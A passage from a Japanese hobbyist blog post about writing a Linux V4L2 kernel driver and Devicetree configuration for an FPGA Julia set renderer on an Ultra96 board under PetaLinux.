<span id="cb12-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb12-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb12-3" aria-hidden="true" tabindex="-1"></a>	<span class="kw">struct</span> fractal_device <span class="op">*</span>fractal<span class="op">;</span></span>
<span id="cb12-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb12-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb12-5" aria-hidden="true" tabindex="-1"></a>	fractal <span class="op">=</span> devm_kzalloc<span class="op">(&amp;</span>dev<span class="op">-&gt;</span>dev<span class="op">,</span> <span class="kw">sizeof</span> <span class="op">*</span>fractal<span class="op">,</span> GFP_KERNEL<span class="op">);</span></span>
<span id="cb12-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb12-6" aria-hidden="true" tabindex="-1"></a>	<span class="cf">if</span> <span class="op">(!</span>fractal<span class="op">)</span></span>
<span id="cb12-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb12-7" aria-hidden="true" tabindex="-1"></a>		<span class="cf">return</span> <span class="op">-</span>ENOMEM<span class="op">;</span></span></code></pre></div>
<p>続いて、<code>fractal-&gt;iomem</code> からデバイスのレジスタ (<a href="https://en.wikipedia.org/wiki/Memory-mapped_I/O">MMIO</a> なデバイスになっている) にアクセスできるようにします。こんな感じにすればいいようです。</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb13-1" aria-hidden="true" tabindex="-1"></a>	<span class="kw">struct</span> resource <span class="op">*</span>res<span class="op">;</span></span>
<span id="cb13-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb13-2" aria-hidden="true" tabindex="-1"></a>	<span class="dt">int</span> ret<span class="op">;</span></span>
<span id="cb13-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb13-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb13-4" aria-hidden="true" tabindex="-1"></a>	res <span class="op">=</span> platform_get_resource<span class="op">(</span>dev<span class="op">,</span> IORESOURCE_MEM<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb13-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb13-5" aria-hidden="true" tabindex="-1"></a>	fractal<span class="op">-&gt;</span>iomem <span class="op">=</span> devm_ioremap_resource<span class="op">(</span>fractal<span class="op">-&gt;</span>dev<span class="op">,</span> res<span class="op">);</span></span>
<span id="cb13-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb13-6" aria-hidden="true" tabindex="-1"></a>	<span class="cf">if</span> <span class="op">(</span>IS_ERR<span class="op">(</span>fractal<span class="op">-&gt;</span>iomem<span class="op">))</span></span>
<span id="cb13-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb13-7" aria-hidden="true" tabindex="-1"></a>		<span class="cf">return</span> PTR_ERR<span class="op">(</span>fractal<span class="op">-&gt;</span>iomem<span class="op">);</span></span></code></pre></div>
<p>これで <code>fractal-&gt;iomem</code> 経由でデバイスのレジスタにアクセスできるようになったので、例えば <code>ctrl</code> レジスタの <code>START</code> ビットと <code>AUTO_RESTART</code> ビットをセットするならこんな感じでできるようになります。</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb14-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#define FRACTAL_REG_CTRL		0x0</span></span>
<span id="cb14-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define FRACTAL_REG_CTRL_START		BIT(0)</span></span>
<span id="cb14-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#define FRACTAL_REG_CTRL_DONE		BIT(1)</span></span>
<span id="cb14-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#define FRACTAL_REG_CTRL_IDLE		BIT(2)</span></span>
<span id="cb14-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#define FRACTAL_REG_CTRL_READY		BIT(3)</span></span>
<span id="cb14-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#define FRACTAL_REG_CTRL_AUTO_RESTART	BIT(7)</span></span>
<span id="cb14-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> fractal_write<span class="op">(</span><span class="kw">struct</span> fractal_device <span class="op">*</span>dev<span class="op">,</span> u32 addr<span class="op">,</span> u32 value<span class="op">)</span></span>
<span id="cb14-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb14-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-10" aria-hidden="true" tabindex="-1"></a>	iowrite32<span class="op">(</span>value<span class="op">,</span> dev<span class="op">-&gt;</span>iomem <span class="op">+</span> addr<span class="op">);</span></span>
<span id="cb14-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb14-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-13"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-13" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> fractal_set<span class="op">(</span><span class="kw">struct</span> fractal_device <span class="op">*</span>dev<span class="op">,</span> u32 addr<span class="op">,</span> u32 value<span class="op">)</span></span>
<span id="cb14-14"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-14" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb14-15"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-15" aria-hidden="true" tabindex="-1"></a>	fractal_write<span class="op">(</span>dev<span class="op">,</span> addr<span class="op">,</span> fractal_read<span class="op">(</span>dev<span class="op">,</span> addr<span class="op">)</span> <span class="op">|</span> value<span class="op">);</span></span>
<span id="cb14-16"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-16" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb14-17"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-18"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-18" aria-hidden="true" tabindex="-1"></a>fractal_set<span class="op">(</span>fractal<span class="op">,</span> FRACTAL_REG_CTRL<span class="op">,</span></span>
<span id="cb14-19"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-19" aria-hidden="true" tabindex="-1"></a>	    FRACTAL_REG_CTRL_AUTO_RESTART <span class="op">|</span></span>
<span id="cb14-20"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb14-20" aria-hidden="true" tabindex="-1"></a>	    FRACTAL_REG_CTRL_START<span class="op">);</span></span></code></pre></div>
<p>ちなみに、ここまでで登場した <a href="https://elixir.bootlin.com/linux/v4.14/source/include/linux/device.h#L660"><code>devm_kzalloc</code></a> や <a href="https://elixir.bootlin.com/linux/v4.4/source/lib/devres.c#L134"><code>devm_ioremap_resource</code></a> などの <code>devm_xxx</code> 系の関数は <a href="https://lwn.net/Articles/222860/">Managed resource API</a> と呼ばれるもので、この関数を使って確保した各種リソースはデバイスドライバがアンロードされたときに自動で解放してくれるそうです。便利。</p>
<p>最後に V4L2 関連の初期化です。これも流れとしては必要な値を設定したり、各種必要な処理を実装してその関数ポインタを渡すというもので、だいたいこんな感じになりました。</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> fractal_s_stream<span class="op">(</span><span class="kw">struct</span> v4l2_subdev <span class="op">*</span>subdev<span class="op">,</span> <span class="dt">int</span> enable<span class="op">)</span></span>
<span id="cb15-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb15-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-3" aria-hidden="true" tabindex="-1"></a>	<span class="co">// なんか実装</span></span>
<span id="cb15-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb15-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">const</span> <span class="kw">struct</span> v4l2_subdev_core_ops fractal_core_ops <span class="op">=</span> <span class="op">{</span></span>
<span id="cb15-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-7" aria-hidden="true" tabindex="-1"></a>	<span class="co">// ...</span></span>
<span id="cb15-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb15-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-10" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">const</span> <span class="kw">struct</span> v4l2_subdev_video_ops fractal_video_ops <span class="op">=</span> <span class="op">{</span></span>
<span id="cb15-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-11" aria-hidden="true" tabindex="-1"></a>	<span class="op">.</span>s_stream <span class="op">=</span> fractal_s_stream<span class="op">,</span></span>
<span id="cb15-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-12" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb15-13"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-14"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-14" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">const</span> <span class="kw">struct</span> v4l2_subdev_pad_ops fractal_pad_ops <span class="op">=</span> <span class="op">{</span></span>
<span id="cb15-15"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-15" aria-hidden="true" tabindex="-1"></a>	<span class="co">// ...</span></span>
<span id="cb15-16"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-16" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb15-17"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-18"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-18" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">const</span> <span class="kw">struct</span> v4l2_subdev_ops fractal_ops <span class="op">=</span> <span class="op">{</span></span>
<span id="cb15-19"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-19" aria-hidden="true" tabindex="-1"></a>	<span class="op">.</span>core   <span class="op">=</span> <span class="op">&amp;</span>fractal_core_ops<span class="op">,</span></span>
<span id="cb15-20"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-20" aria-hidden="true" tabindex="-1"></a>	<span class="op">.</span>video  <span class="op">=</span> <span class="op">&amp;</span>fractal_video_ops<span class="op">,</span></span>
<span id="cb15-21"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-21" aria-hidden="true" tabindex="-1"></a>	<span class="op">.</span>pad    <span class="op">=</span> <span class="op">&amp;</span>fractal_pad_ops<span class="op">,</span></span>
<span id="cb15-22"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-22" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb15-23"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-24"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-24" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> fractal_probe<span class="op">(</span><span class="kw">struct</span> platform_device <span class="op">*</span>dev<span class="op">)</span></span>
<span id="cb15-25"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-25" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb15-26"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-26" aria-hidden="true" tabindex="-1"></a>	<span class="kw">struct</span> v4l2_subdev <span class="op">*</span>subdev<span class="op">;</span></span>
<span id="cb15-27"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-28"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-28" aria-hidden="true" tabindex="-1"></a>	<span class="co">// その他の設定 ...</span></span>
<span id="cb15-29"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-30"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-30" aria-hidden="true" tabindex="-1"></a>	subdev <span class="op">=</span> <span class="op">&amp;</span>fractal<span class="op">-&gt;</span>subdev<span class="op">;</span></span>
<span id="cb15-31"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-31" aria-hidden="true" tabindex="-1"></a>	v4l2_subdev_init<span class="op">(</span>subdev<span class="op">,</span> <span class="op">&amp;</span>fractal_ops<span class="op">);</span></span>
<span id="cb15-32"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-32" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-33"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-33" aria-hidden="true" tabindex="-1"></a>	<span class="co">// その他の設定 ...</span></span>
<span id="cb15-34"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb15-34" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p><code>s_stream</code> はストリーミングの開始・終了時 (<a href="https://www.kernel.org/doc/html/v4.14/media/uapi/v4l/vidioc-streamon.html"><code>ioctl VIDIOC_STREAMON</code>, <code>ioctl VIDIOC_STREAMOFF</code></a>) に呼ばれる関数です。今回実装した Julia set 描画回路は描画の開始と終了を制御してやる必要があるので、このように実装しました。ストリーミングの開始時には、適用な初期値の設定も行っています。</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb16-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="kw">inline</span> <span class="kw">struct</span> fractal_device</span>
<span id="cb16-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>get_fractal_device<span class="op">(</span><span class="kw">struct</span> v4l2_subdev <span class="op">*</span>subdev<span class="op">)</span></span>
<span id="cb16-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb16-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-4" aria-hidden="true" tabindex="-1"></a>	<span class="cf">return</span> container_of<span class="op">(</span>subdev<span class="op">,</span> <span class="kw">struct</span> fractal_device<span class="op">,</span> subdev<span class="op">);</span></span>
<span id="cb16-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb16-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> fractal_s_stream<span class="op">(</span><span class="kw">struct</span> v4l2_subdev <span class="op">*</span>subdev<span class="op">,</span> <span class="dt">int</span> enable<span class="op">)</span></span>
<span id="cb16-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-8" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb16-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-9" aria-hidden="true" tabindex="-1"></a>	<span class="kw">struct</span> fractal_device <span class="op">*</span>fractal <span class="op">=</span> get_fractal_device<span class="op">(</span>subdev<span class="op">);</span></span>
<span id="cb16-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-11" aria-hidden="true" tabindex="-1"></a>	<span class="cf">if</span> <span class="op">(</span>enable<span class="op">)</span> <span class="op">{</span></span>
<span id="cb16-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-12" aria-hidden="true" tabindex="-1"></a>		fractal_write<span class="op">(</span>fractal<span class="op">,</span> FRACTAL_REG_X0<span class="op">,</span> <span class="bn">0x10000000</span><span class="bu">u</span><span class="op">);</span></span>
<span id="cb16-13"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-13" aria-hidden="true" tabindex="-1"></a>		fractal_write<span class="op">(</span>fractal<span class="op">,</span> FRACTAL_REG_Y0<span class="op">,</span> <span class="bn">0x09000000</span><span class="bu">u</span><span class="op">);</span></span>
<span id="cb16-14"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-14" aria-hidden="true" tabindex="-1"></a>		fractal_write<span class="op">(</span>fractal<span class="op">,</span> FRACTAL_REG_DX<span class="op">,</span> <span class="bn">0x00044444</span><span class="bu">u</span><span class="op">);</span></span>
<span id="cb16-15"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-15" aria-hidden="true" tabindex="-1"></a>		fractal_write<span class="op">(</span>fractal<span class="op">,</span> FRACTAL_REG_DY<span class="op">,</span> <span class="bn">0x00044444</span><span class="bu">u</span><span class="op">);</span></span>
<span id="cb16-16"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-16" aria-hidden="true" tabindex="-1"></a>		fractal_write<span class="op">(</span>fractal<span class="op">,</span> FRACTAL_REG_CR<span class="op">,</span> <span class="bn">0xf9999999</span><span class="bu">u</span><span class="op">);</span></span>
<span id="cb16-17"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-17" aria-hidden="true" tabindex="-1"></a>		fractal_write<span class="op">(</span>fractal<span class="op">,</span> FRACTAL_REG_CI<span class="op">,</span> <span class="bn">0x09999999</span><span class="bu">u</span><span class="op">);</span></span>
<span id="cb16-18"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-19"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-19" aria-hidden="true" tabindex="-1"></a>		fractal_set<span class="op">(</span>fractal<span class="op">,</span> FRACTAL_REG_CTRL<span class="op">,</span></span>
<span id="cb16-20"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-20" aria-hidden="true" tabindex="-1"></a>			    FRACTAL_REG_CTRL_AUTO_RESTART <span class="op">|</span></span>
<span id="cb16-21"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-21" aria-hidden="true" tabindex="-1"></a>			    FRACTAL_REG_CTRL_START<span class="op">);</span></span>
<span id="cb16-22"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-22" aria-hidden="true" tabindex="-1"></a>	<span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
<span id="cb16-23"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-23" aria-hidden="true" tabindex="-1"></a>		fractal_clr<span class="op">(</span>fractal<span class="op">,</span> FRACTAL_REG_CTRL<span class="op">,</span></span>
<span id="cb16-24"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-24" aria-hidden="true" tabindex="-1"></a>			    FRACTAL_REG_CTRL_AUTO_RESTART <span class="op">|</span></span>
<span id="cb16-25"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-25" aria-hidden="true" tabindex="-1"></a>			    FRACTAL_REG_CTRL_START<span class="op">);</span></span>
<span id="cb16-26"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-26" aria-hidden="true" tabindex="-1"></a>	<span class="op">}</span></span>
<span id="cb16-27"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-28"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-28" aria-hidden="true" tabindex="-1"></a>	<span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb16-29"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb16-29" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>このほか、<code>fractal_pad_ops</code> の <code>enum_mbus_code</code>、<code>enum_frame_size</code>、<code>get_fmt</code>、<code>set_fmt</code> が実装されています。実装といっても、今回は画像フォーマットは固定であるなどの理由からなにか特別な処理を実装したわけではないので、ここでは省略します。</p>
<h3 id="devicetree-の設定">Devicetree の設定</h3>
<p><a href="https://www.devicetree.org/">Devicetree</a> は、(ソフトウェアから直接探索できない) デバイスのプロパティや接続関係の詳細を記述するためのものだそうです。従来 OS の実装にハードコーディングしていたデバイス固有のパラメータを Devicetree に切り離すことで、OS をより汎用的なコードで実装できるようにするのが狙いだそうです。デバイスドライバの実装の際に MMIO なレジスタをマッピングするなどを行いましたが、ここで必要になる MMIO のアドレスなんかも Devicetree に記述される情報だったりします。ARM の Linux は Devicetree を活用しているものの1つで、今回 Linux に実装したデバイスを認識させるにあたって Devicetree の設定がいくつか必要になります。</p>
<p>PetaLinux Tools を使った開発では、Devicetree の設定を PetaLinux Tools が自動生成した Devicetree に必要に応じてノードの追加・上書きなどをすることによって行うようです。PetaLinux Tools が生成した Devicetree は <code>components/plnx_workspace/device-tree/device-tree/</code> にあります。例えば PL 上の回路に関連するものは <code>pl.dtsi</code> に記述されていて、今回実装した Julia set 描画回路に対応するものはこんな感じになっていました。</p>
<pre class="dts"><code>fractal_0: fractal@a0000000 {
	clock-names = &quot;ap_clk&quot;;
	clocks = &lt;&amp;misc_clk_1&gt;;
	compatible = &quot;xlnx,fractal-1.0&quot;;
	interrupt-names = &quot;interrupt&quot;;
	interrupt-parent = &lt;&amp;gic&gt;;
	interrupts = &lt;0 89 4&gt;;
	reg = &lt;0x0 0xa0000000 0x0 0x10000&gt;;
	xlnx,s-axi-ctrl-addr-width = &lt;0x6&gt;;
	xlnx,s-axi-ctrl-data-width = &lt;0x20&gt;;
};</code></pre>
<p>この生成された Devicetree へのノードの追加・上書きは <code>project-spec/meta-user/recipes-bsp/device-tree/files/system-user.dtsi</code> によって行います。例えば前述した <code>fractal_0</code> に <code>hello = "world";</code> というプロパティを追加したいときはこのような記述を追加します。</p>
<pre class="dts"><code>&amp;fractal_0 {
	hello = &quot;world&quot;;
}</code></pre>
<p>さて、今回 Devicetree に追加しなければいけないのが</p>
<ul>
<li><a href="https://github.com/Xilinx/linux-xlnx/blob/xilinx-v2018.3/Documentation/devicetree/bindings/media/xilinx/xlnx,video.txt">Xilinx Video IP Pipeline (VIPP)</a> ノード</li>
<li>映像処理関連 IP が持つ入出力ポート</li>
<li>各種 IP と VIPP の入出力ポートの接続関係</li>
</ul>
<p>です。とりあえず今回記述した <code>system-user.dtsi</code> が<a href="https://github.com/Tosainu/ultra96-fractal/blob/1ed4e5e409d6445a85741149c112322cc6fc251c/petalinux_project/project-spec/meta-user/recipes-bsp/device-tree/files/system-user.dtsi">こんな感じ</a>になりました。</p>
<pre class="dts"><code>&amp;fractal_0 {
	ports {
		#address-cells = &lt;1&gt;;
		#size-cells = &lt;0&gt;;

		port@0 {
			reg = &lt;0&gt;;
			fractal_0_out_0: endpoint {
				remote-endpoint = &lt;&amp;vcap_0_in_0&gt;;
			};
		};
	};
};

&amp;amba_pl {
	vcap_0: video_cap {
		compatible = &quot;xlnx,video&quot;;
		dmas = &lt;&amp;axi_vdma_0 1&gt;;
		dma-names = &quot;port0&quot;;

		ports {
			#address-cells = &lt;1&gt;;
			#size-cells = &lt;0&gt;;

			port@0 {
				reg = &lt;0&gt;;
				direction = &quot;input&quot;;
				vcap_0_in_0: endpoint {
					remote-endpoint = &lt;&amp;fractal_0_out_0&gt;;
				};
			};
		};
	};
};</code></pre>
<p><code>vcap_0</code> が VIPP ノードです。このノードの <code>compatible</code> には <code>xlnx,video</code> を指定します。また <code>dmas</code> に利用する DMA とその Channel ID を指定します。Stream ID は、<a href="https://github.com/Xilinx/linux-xlnx/blob/xilinx-v2018.3/Documentation/devicetree/bindings/dma/xilinx/xilinx_dma.txt#L105-L112">AXI VDMA の場合</a> 0 が Read channel、1 が Write channel に対応します<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a>。</p>
<p>デバイスの入出力ポートは <code>ports</code> ノード下に記述します。この辺の設定に関しては<a href="https://github.com/Xilinx/linux-xlnx/blob/xilinx-v2018.3/Documentation/devicetree/bindings/media/video-interfaces.txt">ここ</a>を参考にすればよいでしょう。今回は <code>fractal_0</code>、<code>vcap_0</code> ともに入力または出力のポートの1つしかないなので <code>port@0</code> のみを記述し、それぞれ <code>remote-endpoint</code> にポートの接続先を指定してやりました。</p>
<h3 id="ブート時にドライバが読み込まれるようにする">ブート時にドライバが読み込まれるようにする</h3>
<p>デバイスドライバは PetaLinux プロジェクトのディレクトリで <code>petalinux-create --type modules</code> コマンドを実行することでプロジェクトに追加したカーネルモジュールとして実装しました。しかしこの追加したカーネルモジュールなのですが、<code>petalinux-config -c rootfs</code> で開いたメニューから有効にするだけでは、ビルドはされるもののブート時に自動で読み込まれるようになってくれませんでした。</p>
<p>追加したカーネルモジュールをブート時に自動的に読み込まれるようにするには、プロジェクトの <code>project-spec/meta-user/conf/petalinuxbsp.conf</code> に以下の行を追加する必要があるようです。</p>
<pre class="conf"><code>KERNEL_MODULE_AUTOLOAD_append = &quot; &lt;module-name&gt;&quot;</code></pre>
<p>ちなみに、この <code>KERNEL_MODULE_AUTOLOAD</code> に関するドキュメントは<a href="https://www.yoctoproject.org/docs/2.4/ref-manual/ref-manual.html#migration-1.7-kernel-module-autoloading">ここ</a>にあります。PetaLinux が Yocto Project をベースにしている (？) ためかこのあたりの設定項目のドキュメントは Yocto Project 側にあることも多く、調べるのが少し大変でした。</p>
<h2 id="描画した-julia-set-をカッコよく表示できるようにする">描画した Julia set をカッコよく表示できるようにする</h2>
